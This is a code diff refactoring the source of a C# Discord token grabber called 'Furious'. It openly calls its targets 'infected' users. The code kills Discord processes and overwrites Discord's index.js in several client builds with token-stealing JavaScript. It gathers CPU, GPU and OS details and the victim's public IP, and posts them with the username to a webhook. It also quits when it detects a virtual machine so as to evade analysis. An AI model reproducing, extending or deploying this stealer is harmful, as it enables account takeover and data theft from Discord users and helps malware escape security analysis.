@@ -13,45 +13,23 @@ namespace Furious
 {
     public class Grabber
     {
-		public static bool UsingVM()
-		{
-			///If the process is running within a Virtual Machine, the process will close before executing code.
-			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
-			{
-				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
-				{
-					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
-					{
-						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
-						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
-						{
-							Console.WriteLine("Using VM: true");
-							return true;
-						}
-					}
-				}
-			}
-			Console.WriteLine("Using VM: false");
-			return false;
-		}
-
 		///This method allows the user to choose to customise the grabber, whether they want to inject the token grabbing code, get the infected user's hardware information, and choose to check for a virtual machine.
 		public static async Task QuickStart(bool injectJS = false, bool getUserHardware = false, bool checkForVM = false)
 		{
 			if (checkForVM)
 			{ 
-				if (UsingVM())
+				if (await UsingVM())
 					Environment.Exit(0);
 			}
 			if (injectJS)
-				CloseProcesses();
+				await CloseProcesses();
 			if (getUserHardware)
 				await SendData(await GetHardware());
 		}
 
 		///This method is used to write the token grabbing JavaScript code into the Discord directory.
 		public static async Task InjectJS()
-        	{
+        {
 			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
 			{
 				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord");
@@ -61,7 +39,7 @@ namespace Furious
 					{
 						FileManagement.DiscordPath = folderName + @"\modules\discord_modules\index.js";
 						await FileManagement.CleanFile(FileManagement.DiscordPath);
-						await FileManagement.WriteDiscord(FileManagement.DiscordPath);
+						await FileManagement.WriteDiscord(FileManagement.DiscordPath, "Resources.stable.txt");
 					}
 				}
 			}
@@ -74,7 +52,7 @@ namespace Furious
 					{
 						FileManagement.PTBPath = folderName + @"\modules\discord_modules\index.js";
 						await FileManagement.CleanFile(FileManagement.PTBPath);
-						await FileManagement.WriteDiscord(FileManagement.PTBPath);
+						await FileManagement.WriteDiscord(FileManagement.PTBPath, "Resources.ptb.txt");
 					}
 				}
 			}
@@ -87,7 +65,7 @@ namespace Furious
 					{
 						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
 						await FileManagement.CleanFile(FileManagement.CanaryPath);
-                        			await FileManagement.WriteDiscord(FileManagement.CanaryPath);
+                        await FileManagement.WriteDiscord(FileManagement.CanaryPath, "Resources.canary.txt");
 					}
 				}
 			}
@@ -101,19 +79,19 @@ namespace Furious
 						Console.WriteLine(folderName);
 						FileManagement.DevelopmentPath = folderName + @"\modules\discord_modules\index.js";
 						await FileManagement.CleanFile(FileManagement.DevelopmentPath);
-						await FileManagement.WriteDiscord(FileManagement.DevelopmentPath);
+						await FileManagement.WriteDiscord(FileManagement.DevelopmentPath, "Resources.development.txt");
 					}
 				}
 			}
 		}
 
 		///Closes all processes which contain "discord" in their name before writing the JS.
-		private static async void CloseProcesses()
+		private static async Task CloseProcesses()
 		{
 			Process.GetProcesses().Where(p => p.ProcessName.Contains("discord")).ToList().ForEach(y => y.Kill());
 
 			await InjectJS();
-        	}
+        }
 
 		///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
 		public static async Task<string> GetHardware()
@@ -131,9 +109,9 @@ namespace Furious
 					sb.AppendLine($"GPU: {obj["Name"]}");
 				}
 				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
-                		{
+                {
 					sb.AppendLine($"OS: {obj["Caption"]}");
-                		}
+                }
 			});
 
 			Console.WriteLine(sb.ToString());
@@ -155,7 +133,7 @@ namespace Furious
 						{ "content", $"Data for '{ Environment.UserName }' @ { await GrabIP() }	```{ data }```" }
 					};
 
-                    			response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
+                    response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
 				}
 				catch (HttpRequestException ex)
 				{
@@ -167,6 +145,28 @@ namespace Furious
 			async Task<string> GrabIP() => await new WebClient().DownloadStringTaskAsync("https://ipv4.icanhazip.com");
 
 			return response;
+		}
+
+		public static Task<bool> UsingVM()
+		{
+			///If the process is running within a Virtual Machine, the process will close before executing code.
+			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+			{
+				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
+				{
+					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
+					{
+						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
+						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
+						{
+							Console.WriteLine("Using VM: true");
+							return Task.FromResult(true);
+						}
+					}
+				}
+			}
+			Console.WriteLine("Using VM: false");
+			return Task.FromResult(false);
 		}
 	}
 }
